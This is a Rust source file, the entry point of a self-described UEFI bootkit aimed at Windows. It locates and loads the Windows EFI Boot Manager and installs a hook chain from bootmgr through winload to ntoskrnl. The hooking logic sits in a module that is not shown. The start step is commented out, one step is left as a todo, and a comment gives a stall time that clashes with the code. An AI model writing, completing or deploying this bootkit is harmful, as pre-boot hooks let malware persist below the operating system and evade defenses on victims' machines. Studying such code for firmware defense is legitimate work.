#![no_main]
#![no_std]

use log;
use uefi::{prelude::*, table::boot::LoadImageSource};

mod boot;

// The image handle represents the currently-running executable, and the system table provides access to many different UEFI services.
#[entry]
fn main(image_handle: Handle, mut system_table: SystemTable<Boot>) -> Status {
    // uefi_services is setting a simple memory allocator, initializing the logger, and providing a panic handler.
    uefi_services::init(&mut system_table).unwrap();

    //
    // 0. Clear stdout/stderr output screen
    //
    system_table
        .stdout()
        .clear()
        .expect("Failed to clear the stdout output screen.");
    system_table
        .stderr()
        .clear()
        .expect("Failed to clear the stderr output screen.");

    log::info!("### UEFI Bootkit in Rust ###");

    //
    // 1. Locate Windows EFI Boot Manager (\EFI\Microsoft\Boot\bootmgfw.efi)
    //

    // Access boot services
    let boot_services = system_table.boot_services();

    log::info!("Finding Windows EFI Boot Manager (\\EFI\\Microsoft\\Boot\\bootmgfw.efi) device");
    // Gets the Windows EFI Boot Manager device as slice of bytes
    let bootmgr_data =
        boot::get_windows_bootmgr_device("\\EFI\\Microsoft\\Boot\\bootmgfw.efi", &boot_services)
            .expect("Failed to get device path");
    log::info!("Found Windows EFI Boot Manager device");
    log::info!("Pointer: {:p} Size: {}", bootmgr_data.as_ptr(), bootmgr_data.len());

    //
    // 2. Set BootCurrent to Windows Boot Manager (bootmgr) option
    //

    // todo: set_bootcurrent_to_windows_bootmgr()

    //
    // 3. Load the Windows EFI Boot Manager (bootmgr)
    //

    log::info!("Loading Windows Boot Manager image into memory");
    // Load an EFI image into memory and return a Handle to the image.
    // There are two ways to load the image: by copying raw image data from a source buffer, or by loading the image via the SimpleFileSystem protocol
    let bootmgr_handle = boot_services.load_image(
        image_handle,
        LoadImageSource::FromBuffer {
            buffer: &bootmgr_data,
            file_path: None,
        },
    ).expect("Failed to load image");

    log::info!("Successfully loaded Windows Boot Manager image into memory");

    //
    // 4. Set up the hook chain from bootmgr -> windload -> ntoskrnl
    //

    log::info!("Setting up hooks bootmgr -> windload -> ntoskrnl");
    boot::setup_hooks(bootmgr_handle, &boot_services);

    //
    // 5. Start Windows EFI Boot Manager (bootmgr)
    //

    //boot_services.start_image(bootmgr_handle);

    // Make the system pause for 10 seconds
    log::info!("Stalling the processor for 20 seconds");
    system_table.boot_services().stall(20_000_000);
    Status::SUCCESS
}
